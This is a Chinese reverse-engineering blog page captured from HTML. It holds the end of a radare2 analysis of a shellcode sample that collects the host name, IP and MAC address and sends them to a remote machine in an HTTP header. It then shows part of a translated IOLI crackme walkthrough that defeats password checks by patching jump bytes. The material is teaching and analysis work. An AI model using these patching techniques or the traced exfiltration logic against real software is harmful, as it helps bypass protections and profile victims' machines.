</code></pre><p>两次检查结果确认返回了正确的结果，</p>
<p>紧接着，准备数据，调用<code>sendARP</code>获取mac地址</p>
<pre><code>% python hash.py iphlpapi.dll SendARP             
[+] Ran on Tue Aug <span class="number">19</span> <span class="number">16</span>:<span class="number">21</span>:<span class="number">37</span> <span class="number">2014</span>

[+] <span class="number">0xB8D27248</span> = iphlpapi.dll!SendARP


  ||   <span class="number">0x0000019d</span>    8d400c       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">eax</span>+<span class="number">0xc</span>]
  ||   <span class="number">0x000001a0</span>    8b00         <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">eax</span>]
  ||   <span class="number">0x000001a2</span>    8b08         <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">eax</span>]
  ||   <span class="number">0x000001a4</span>    8b09         <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">ecx</span>]
  ||   <span class="number">0x000001a6</span>    b800010000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x100</span> <span class="comment">;  0x00000100 </span>
  ||   <span class="number">0x000001ab</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
  ||   <span class="number">0x000001ac</span>    89e7         <span class="keyword">mov</span> <span class="literal">edi</span>, <span class="literal">esp</span>
  ||   <span class="number">0x000001ae</span>    29c4         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">eax</span>
  ||   <span class="number">0x000001b0</span>    89e6         <span class="keyword">mov</span> <span class="literal">esi</span>, <span class="literal">esp</span>
  ||   <span class="number">0x000001b2</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
  ||   <span class="number">0x000001b3</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
  ||   <span class="number">0x000001b4</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
  ||   <span class="number">0x000001b5</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
  ||   <span class="number">0x000001b6</span>    684872d2b8   <span class="keyword">push</span> <span class="number">0xb8d27248</span> <span class="comment">;  sendARP </span>
  ||   <span class="number">0x000001bb</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
</code></pre><p>根据msdn上看到的，<code>edi</code>指向mac地址的长度。接下来比较mac地址是否是六个字节，如果不是……我们之前看到了0x239是<code>closesocket</code></p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x1bf</span>
           <span class="number">0x000001bf</span>    <span class="number">81</span>c404010000 add esp, <span class="number">0x104</span>
           <span class="number">0x000001c5</span>    <span class="number">0f</span>b70f       movzx ecx, word [edi]
           <span class="number">0x000001c8</span>    <span class="number">83f</span>906       cmp ecx, <span class="number">0x6</span>
       ,=&lt; <span class="number">0x000001cb</span>    <span class="number">726</span>c         jb <span class="number">0x239</span>
</code></pre><p>接下来这个乍一看让人困惑，在栈上分配空间，还干了一堆不知道干什么的。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">32</span>@<span class="number">0x1cd</span>
|          <span class="number">0x000001cd</span>    b906000000   mov ecx, <span class="number">0x6</span> ;  <span class="number">0x00000006</span> 
|          <span class="number">0x000001d2</span>    b810000000   mov eax, <span class="number">0x10</span> ;  <span class="number">0x00000010</span> 
|          <span class="number">0x000001d7</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x000001d9</span>    <span class="number">89e7</span>         mov edi, esp
|          <span class="number">0x000001db</span>    <span class="number">89</span>ca         mov edx, ecx
|          <span class="number">0x000001dd</span>    d1e2         shl edx, <span class="number">1</span>
|          <span class="number">0x000001df</span>    <span class="number">50</span>           push eax
|          <span class="number">0x000001e0</span>    <span class="number">52</span>           push edx
|          ; JMP XREF from <span class="number">0x0000020b</span> (fcn<span class="number">.00000090</span>)
|  .-----&gt; <span class="number">0x000001e1</span>    <span class="number">31</span>d2         xor edx, edx
|  |       <span class="number">0x000001e3</span>    <span class="number">8</span>a16         mov dl, [esi]
|  |       <span class="number">0x000001e5</span>    <span class="number">88</span>d0         mov al, dl
|  |       <span class="number">0x000001e7</span>    <span class="number">24f</span>0         and al, <span class="number">0xf0</span>
|  |       <span class="number">0x000001e9</span>    c0e804       shr al, <span class="number">0x4</span>
|  |       <span class="number">0x000001ec</span>    <span class="number">3</span>c09         cmp al, <span class="number">0x9</span>
|  |   ,=&lt; <span class="number">0x000001ee</span>    <span class="number">7704</span>         ja <span class="number">0x1f4</span>
|  |   |   <span class="number">0x000001f0</span>    <span class="number">0430</span>         add al, <span class="number">0x30</span>
|  |  ,==&lt; <span class="number">0x000001f2</span>    eb02         jmp <span class="number">0x1f6</span> ; (fcn<span class="number">.00000090</span>)
|  |  ||   ; JMP XREF from <span class="number">0x000001ee</span> (fcn<span class="number">.00000090</span>)
|  |  |`-&gt; <span class="number">0x000001f4</span>    <span class="number">0437</span>         add al, <span class="number">0x37</span>
|  |  |    ; JMP XREF from <span class="number">0x000001f2</span> (fcn<span class="number">.00000090</span>)
|  |  `--&gt; <span class="number">0x000001f6</span>    <span class="number">8807</span>         mov [edi], al
|  |       <span class="number">0x000001f8</span>    <span class="number">47</span>           inc edi
|  |       <span class="number">0x000001f9</span>    <span class="number">88</span>d0         mov al, dl
|  |       <span class="number">0x000001fb</span>    <span class="number">240f</span>         and al, <span class="number">0xf</span>
|  |       <span class="number">0x000001fd</span>    <span class="number">3</span>c09         cmp al, <span class="number">0x9</span>
|  | ,===&lt; <span class="number">0x000001ff</span>    <span class="number">7704</span>         ja <span class="number">0x205</span>
|  | |     <span class="number">0x00000201</span>    <span class="number">0430</span>         add al, <span class="number">0x30</span>
|  |,====&lt; <span class="number">0x00000203</span>    eb02         jmp <span class="number">0x207</span> ; (fcn<span class="number">.00000090</span>)
|  |||     ; JMP XREF from <span class="number">0x000001ff</span> (fcn<span class="number">.00000090</span>)
|  ||`---&gt; <span class="number">0x00000205</span>    <span class="number">0437</span>         add al, <span class="number">0x37</span>
|  ||      ; JMP XREF from <span class="number">0x00000203</span> (fcn<span class="number">.00000090</span>)
|  |`----&gt; <span class="number">0x00000207</span>    <span class="number">8807</span>         mov [edi], al
|  |       <span class="number">0x00000209</span>    <span class="number">47</span>           inc edi
|  |       <span class="number">0x0000020a</span>    <span class="number">46</span>           inc esi
|  `=====&lt; <span class="number">0x0000020b</span>    e2d4         loop <span class="number">0x1e1</span>
|          <span class="number">0x0000020d</span>    <span class="number">59</span>           pop ecx
</code></pre><p>后来看看原来如此</p>
<pre><code>In [<span class="number">9</span>]: chr(<span class="number">10</span>+<span class="number">0x37</span>)
Out[<span class="number">9</span>]: <span class="string">'A'</span>

In [<span class="number">10</span>]: chr(<span class="number">9</span>+<span class="number">0x30</span>)
Out[<span class="number">10</span>]: <span class="string">'9'</span>
</code></pre><p>原来是把mac地址转换成可打印字符。</p>
<p>下一步，估计就是放进http报头中发送了。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x0000020d</span>
|          <span class="number">0x0000020d</span>    <span class="number">59</span>           <span class="keyword">pop</span> <span class="literal">ecx</span>
|          <span class="number">0x0000020e</span>    29cf         <span class="keyword">sub</span> <span class="literal">edi</span>, <span class="literal">ecx</span>
|          <span class="number">0x00000210</span>    89fe         <span class="keyword">mov</span> <span class="literal">esi</span>, <span class="literal">edi</span>
|          <span class="number">0x00000212</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
|          <span class="number">0x00000213</span>    01c4         <span class="keyword">add</span> <span class="literal">esp</span>, <span class="literal">eax</span>
|          <span class="number">0x00000215</span>    8bbd4b020000 <span class="keyword">mov</span> <span class="literal">edi</span>, [<span class="literal">ebp</span>+<span class="number">0x24b</span>]
|          <span class="number">0x0000021b</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
|          <span class="number">0x0000021d</span>    c6854f02000. <span class="keyword">mov</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x24f</span>], <span class="number">0x1</span> <span class="comment">;  0x00000001 </span>
|          <span class="number">0x00000224</span>    e82e000000   <span class="keyword">call</span> <span class="number">0x257</span> <span class="comment">; (fcn.00000252)</span>
|             fcn<span class="string">.00000252</span>()
|          <span class="number">0x00000229</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
</code></pre><p>果然是，调用<code>0x257</code>拼接报头。</p>
<p>之后，</p>
<pre><code>[<span class="number">0x00000252</span>]&gt; pd <span class="number">10</span>@<span class="number">0x00000229</span>
|          <span class="number">0x00000229</span>    <span class="number">31</span>c0         xor eax, eax
|          <span class="number">0x0000022b</span>    <span class="number">50</span>           push eax
|          <span class="number">0x0000022c</span>    <span class="number">51</span>           push ecx
|          <span class="number">0x0000022d</span>    <span class="number">29</span>cf         sub edi, ecx
|          <span class="number">0x0000022f</span>    <span class="number">4f</span>           dec edi
|          <span class="number">0x00000230</span>    <span class="number">57</span>           push edi
|          <span class="number">0x00000231</span>    <span class="number">53</span>           push ebx
|          <span class="number">0x00000232</span>    <span class="number">68</span>c2eb385f   push <span class="number">0x5f38ebc2</span> ;  ws2_32!send 
|          <span class="number">0x00000237</span>    ffd5         call ebp
|             fcn<span class="number">.00000000</span>(unk, unk, unk, unk, unk)
|          ; JMP XREF from <span class="number">0x00000141</span> (fcn<span class="number">.00000090</span>)
|          ; JMP XREF from <span class="number">0x00000189</span> (fcn<span class="number">.00000090</span>)
|          ; JMP XREF from <span class="number">0x00000197</span> (fcn<span class="number">.00000090</span>)
|          ; JMP XREF from <span class="number">0x000001cb</span> (fcn<span class="number">.00000090</span>)
|          ;-- closesocket:
|          <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
</code></pre><p>显然将报头send出去了。</p>
<p>最后，关闭socket连接。然后跳回<code>0x10e</code>构造报头然后崩溃……</p>
<pre><code>[<span class="number">0x00000252</span>]&gt; pd <span class="number">10</span>@<span class="number">0x00000239</span>
|      |   ; JMP XREF from <span class="number">0x00000141</span> (fcn<span class="number">.00000090</span>)
|      |   ; JMP XREF from <span class="number">0x00000189</span> (fcn<span class="number">.00000090</span>)
|      |   ; JMP XREF from <span class="number">0x00000197</span> (fcn<span class="number">.00000090</span>)
|      |   ; JMP XREF from <span class="number">0x000001cb</span> (fcn<span class="number">.00000090</span>)
|      |   ;-- closesocket:
|      |   <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
|      |   <span class="number">0x0000023a</span>    <span class="number">68756e4</span>d61   push <span class="number">0x614d6e75</span> ;  <span class="number">0x614d6e75</span> 
|      |   <span class="number">0x0000023f</span>    ffd5         call ebp
|      |      fcn<span class="number">.00000000</span>(unk, unk, unk)
\      `=&lt; <span class="number">0x00000241</span>    e9c8feffff   jmp <span class="number">0x10e</span> ; (fcn<span class="number">.00000090</span>)
</code></pre><p>至此这个shellcode大致做了什么就比较清晰了。与远程主机建立连接，将计算机的机器名获取，又获取IP地址和MAC地址，然后构造HTTP报头发送给远端的机器。</p>
<p>要更加清晰的知道shellcode在干什么，最好还是动态方式调试下。当然得写个测试shellcode的程序了，好像radare2有调试功能……不会用，唉，标记都用不好。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2014/08/08/defeating-ioli-with-radare2/" itemprop="url">
                  Defeating ioli with radare2
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-08T00:00:00+08:00" content="2014-08-08">
              2014-08-08
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2014/08/08/defeating-ioli-with-radare2/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2014/08/08/defeating-ioli-with-radare2/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>译者表示：把两篇文章揉合到了一起。</p>
<p>原文自：<a href="http://dustri.org/b/defeating-ioli-with-radare2.html" target="_blank" rel="external">Defeating ioli with radare2</a><br>和<a href="http://radare.nopcode.org/wiki/index.php?n=Examples.Crackme" target="_blank" rel="external">Crackme solution from pancake</a><br>需要：</p>
<ul>
<li><a href="http://www.radare.org/y/" target="_blank" rel="external">radare2</a></li>
<li><a href="http://www.jegerlehner.ch/intel/" target="_blank" rel="external">asm cheat sheet</a></li>
<li><a href="http://pof.eslack.org/tmp/IOLI-crackme.tar.gz" target="_blank" rel="external">IOLI crackme suite</a>(<a href="http://dustri.org/b/files/IOLI-crackme.tar.gz" target="_blank" rel="external">another mirror</a>)</li>
</ul>
<h2 id="crackme_0x00">crackme 0x00</h2><p>第一个crackme，非常简单。</p>
<pre><code> ✘ ⮀ ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ ./crackme0x00
IOLI Crackme Level <span class="number">0x00</span>
Password: <span class="number">1234</span>
Invalid Password!

⮀ ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x00
 -- I script in C, because fuck you.
[<span class="number">0x08048360</span>]&gt; aa
[<span class="number">0x08048360</span>]&gt; pdf@sym.main
|          ; DATA XREF from <span class="number">0x08048377</span> (fcn<span class="number">.08048356</span>)
/ (fcn) sym.main <span class="number">127</span>
|          <span class="number">0x08048414</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048415</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048417</span>    <span class="number">83</span>ec28       sub esp, <span class="number">0x28</span>
|          <span class="number">0x0804841a</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x0804841d</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048422</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048425</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048428</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x0804842b</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x0804842e</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x08048430</span>    c7042468850. mov dword [esp], str.IOLI_Crackme_Level_0x00_n ; str.IOLI_Crackme_Level_0x00_n
|          <span class="number">0x08048437</span>    e804ffffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048336</span>)
|             fcn<span class="number">.08048336</span>(unk) ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x0804843c</span>    c7042481850. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x08048443</span>    e8f8feffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048336</span>)
|             fcn<span class="number">.08048336</span>() ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x08048448</span>    <span class="number">8</span>d45e8       lea eax, [ebp-<span class="number">0x18</span>]
|          <span class="number">0x0804844b</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x0804844f</span>    c704248c850. mov dword [esp], <span class="number">0x804858c</span> ;  <span class="number">0x0804858c</span> 
|          <span class="number">0x08048456</span>    e8d5feffff   call sym.imp.<span class="built_in">scanf</span> ; (fcn<span class="number">.08048326</span>)
|             fcn<span class="number">.08048326</span>() ; sym.imp.<span class="built_in">scanf</span>
|          <span class="number">0x0804845b</span>    <span class="number">8</span>d45e8       lea eax, [ebp-<span class="number">0x18</span>]
|          <span class="number">0x0804845e</span>    c74424048f8. mov dword [esp+<span class="number">0x4</span>], str<span class="number">.250382</span> ; str<span class="number">.250382</span>
|          <span class="number">0x08048466</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048469</span>    e8e2feffff   call sym.imp.<span class="built_in">strcmp</span> ; (fcn<span class="number">.08048346</span>)
|             fcn<span class="number">.08048346</span>() ; sym.imp.<span class="built_in">strcmp</span>
|          <span class="number">0x0804846e</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x08048470</span>    <span class="number">740</span>e         je <span class="number">0x8048480</span>
|      |   <span class="number">0x08048472</span>    c7042496850. mov dword [esp], str.Invalid_Password__n ; str.Invalid_Password__n
|      |   <span class="number">0x08048479</span>    e8c2feffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048336</span>)
|      |      fcn<span class="number">.08048336</span>() ; sym.imp.<span class="built_in">printf</span>
|     ,==&lt; <span class="number">0x0804847e</span>    eb0c         jmp <span class="number">0x804848c</span> ; (sym.main)
|     ||   ; JMP XREF from <span class="number">0x08048470</span> (unk)
|     |`-&gt; <span class="number">0x08048480</span>    c70424a9850. mov dword [esp], str.Password_OK____n ; str.Password_OK____n
|     |    <span class="number">0x08048487</span>    e8b4feffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048336</span>)
|     |       fcn<span class="number">.08048336</span>() ; sym.imp.<span class="built_in">printf</span>
|     `--&gt; <span class="number">0x0804848c</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048491</span>    c9           leave
\          <span class="number">0x08048492</span>    c3           ret
[<span class="number">0x08048360</span>]&gt; s <span class="number">0x0804847e</span>
[<span class="number">0x0804847e</span>]&gt; wx eb
[<span class="number">0x0804847e</span>]&gt; px <span class="number">20</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x0804847e</span>  eb0c c704 <span class="number">24</span>a9 <span class="number">8504</span> <span class="number">08e8</span> b4fe ffff b800  ....$...........
<span class="number">0x0804848e</span>  <span class="number">0000</span> <span class="number">00</span>c9                                ....            
[<span class="number">0x0804847e</span>]&gt; pD <span class="number">20</span>
|      ,=&lt; <span class="number">0x0804847e</span>    eb0c         jmp <span class="number">0x804848c</span> ; (sym.main)
|      |   ; JMP XREF from <span class="number">0x08048470</span> (unk)
|      |   <span class="number">0x08048480</span>    c70424a9850. mov dword [esp], str.Password_OK____n ; str.Password_OK____n
|      |   <span class="number">0x08048487</span>    e8b4feffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048336</span>)
|      |      fcn<span class="number">.08048336</span>() ; sym.imp.<span class="built_in">printf</span>
|      `-&gt; <span class="number">0x0804848c</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048491</span>    c9           leave
[<span class="number">0x08048470</span>]&gt; q
</code></pre><p>输入任何密码。</p>
<pre><code> <span class="regexp">~/Work/</span>project<span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x00
IOLI Crackme Level <span class="number">0x00</span>
<span class="string">Password:</span> <span class="number">12345</span>
Password <span class="string">OK :</span>)
</code></pre><h2 id="crackme0x01">crackme0x01</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x01
IOLI Crackme Level <span class="number">0</span>x01
Password: <span class="number">12345</span>
Invalid Password!
</code></pre><p>反汇编我们看到有个跳转到<code>OK</code>的<code>je</code>，改成<code>jmp</code></p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x01
 -- Deltify your life with radare2
[<span class="number">0x08048330</span>]&gt; aa
[<span class="number">0x08048330</span>]&gt; pdf@sym.main 
|          ; DATA XREF from <span class="number">0x08048347</span> (fcn<span class="number">.08048322</span>)
/ (fcn) sym.main <span class="number">113</span>
|          <span class="number">0x080483e4</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x080483e5</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x080483e7</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x080483ea</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x080483ed</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x080483f2</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080483f5</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080483f8</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x080483fb</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x080483fe</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x08048400</span>    c7042428850. mov dword [esp], str.IOLI_Crackme_Level_0x01_n ; str.IOLI_Crackme_Level_0x01_n
|          <span class="number">0x08048407</span>    e810ffffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|             fcn<span class="number">.08048312</span>(unk) ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x0804840c</span>    c7042441850. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x08048413</span>    e804ffffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|             fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x08048418</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804841b</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x0804841f</span>    c704244c850. mov dword [esp], <span class="number">0x804854c</span> ;  <span class="number">0x0804854c</span> 
|          <span class="number">0x08048426</span>    e8e1feffff   call sym.imp.<span class="built_in">scanf</span> ; (fcn<span class="number">.08048302</span>)
|             fcn<span class="number">.08048302</span>() ; sym.imp.<span class="built_in">scanf</span>
|          <span class="number">0x0804842b</span>    <span class="number">817</span>dfc9a140. cmp dword [ebp-<span class="number">0x4</span>], <span class="number">0x149a</span>
|      ,=&lt; <span class="number">0x08048432</span>    <span class="number">740</span>e         je <span class="number">0x8048442</span>
|      |   <span class="number">0x08048434</span>    c704244f850. mov dword [esp], str.Invalid_Password__n ; str.Invalid_Password__n
|      |   <span class="number">0x0804843b</span>    e8dcfeffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|      |      fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|     ,==&lt; <span class="number">0x08048440</span>    eb0c         jmp <span class="number">0x804844e</span> ; (sym.main)
|     ||   ; JMP XREF from <span class="number">0x08048432</span> (unk)
|     |`-&gt; <span class="number">0x08048442</span>    c7042462850. mov dword [esp], str.Password_OK____n ; str.Password_OK____n
|     |    <span class="number">0x08048449</span>    e8cefeffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|     |       fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|     `--&gt; <span class="number">0x0804844e</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048453</span>    c9           leave
\          <span class="number">0x08048454</span>    c3           ret
[<span class="number">0x08048330</span>]&gt; s <span class="number">0x08048432</span>
[<span class="number">0x08048432</span>]&gt; wx eb
[<span class="number">0x08048432</span>]&gt; q
</code></pre><p>接着输入任何密码：</p>
<pre><code> <span class="regexp">~/Work/</span>project<span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x01
IOLI Crackme Level <span class="number">0x01</span>
<span class="string">Password:</span> <span class="number">12345</span>
Password <span class="string">OK :</span>)
</code></pre><h2 id="crackme0x02">crackme0x02</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x02
IOLI Crackme Level <span class="number">0</span>x02
Password: <span class="number">12345</span>
Invalid Password!
</code></pre><p>这回还是个比较，将后面的<code>je</code>判断改成<code>nop</code>。有兴趣还可以笔算下怎么生成的密码。</p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x02
 -- Invert the block bytes <span class="keyword">using</span> the <span class="string">'I'</span> key in visual mode
[<span class="number">0x08048330</span>]&gt; aa
[<span class="number">0x08048330</span>]&gt; pdf@sym.main
|          ; DATA XREF from <span class="number">0x08048347</span> (fcn<span class="number">.08048322</span>)
/ (fcn) sym.main <span class="number">144</span>
|          <span class="number">0x080483e4</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x080483e5</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x080483e7</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x080483ea</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x080483ed</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x080483f2</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080483f5</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080483f8</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x080483fb</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x080483fe</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x08048400</span>    c7042448850. mov dword [esp], str.IOLI_Crackme_Level_0x02_n ; str.IOLI_Crackme_Level_0x02_n
|          <span class="number">0x08048407</span>    e810ffffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|             fcn<span class="number">.08048312</span>(unk) ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x0804840c</span>    c7042461850. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x08048413</span>    e804ffffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|             fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|          <span class="number">0x08048418</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804841b</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x0804841f</span>    c704246c850. mov dword [esp], <span class="number">0x804856c</span> ;  <span class="number">0x0804856c</span> 
|          <span class="number">0x08048426</span>    e8e1feffff   call sym.imp.<span class="built_in">scanf</span> ; (fcn<span class="number">.08048302</span>)
|             fcn<span class="number">.08048302</span>() ; sym.imp.<span class="built_in">scanf</span>
|          <span class="number">0x0804842b</span>    c745f85a000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x5a</span> ;  <span class="number">0x0000005a</span> 
|          <span class="number">0x08048432</span>    c745f4ec010. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x1ec</span> ;  <span class="number">0x000001ec</span> 
|          <span class="number">0x08048439</span>    <span class="number">8</span>b55f4       mov edx, [ebp-<span class="number">0xc</span>]
|          <span class="number">0x0804843c</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x0804843f</span>    <span class="number">0110</span>         add [eax], edx
|          <span class="number">0x08048441</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x08048444</span>    <span class="number">0f</span>af45f8     imul eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x08048448</span>    <span class="number">8945f</span>4       mov [ebp-<span class="number">0xc</span>], eax
|          <span class="number">0x0804844b</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804844e</span>    <span class="number">3</span>b45f4       cmp eax, [ebp-<span class="number">0xc</span>]
|      ,=&lt; <span class="number">0x08048451</span>    <span class="number">750</span>e         jne <span class="number">0x8048461</span>
|      |   <span class="number">0x08048453</span>    c704246f850. mov dword [esp], str.Password_OK____n ; str.Password_OK____n
|      |   <span class="number">0x0804845a</span>    e8bdfeffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|      |      fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|     ,==&lt; <span class="number">0x0804845f</span>    eb0c         jmp <span class="number">0x804846d</span> ; (sym.main)
|     ||   ; JMP XREF from <span class="number">0x08048451</span> (unk)
|     |`-&gt; <span class="number">0x08048461</span>    c704247f850. mov dword [esp], str.Invalid_Password__n ; str.Invalid_Password__n
|     |    <span class="number">0x08048468</span>    e8affeffff   call sym.imp.<span class="built_in">printf</span> ; (fcn<span class="number">.08048312</span>)
|     |       fcn<span class="number">.08048312</span>() ; sym.imp.<span class="built_in">printf</span>
|     `--&gt; <span class="number">0x0804846d</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048472</span>    c9           leave
\          <span class="number">0x08048473</span>    c3           ret
[<span class="number">0x08048330</span>]&gt; s <span class="number">0x08048451</span>
[<span class="number">0x08048451</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048451</span>]&gt; px <span class="number">10</span>
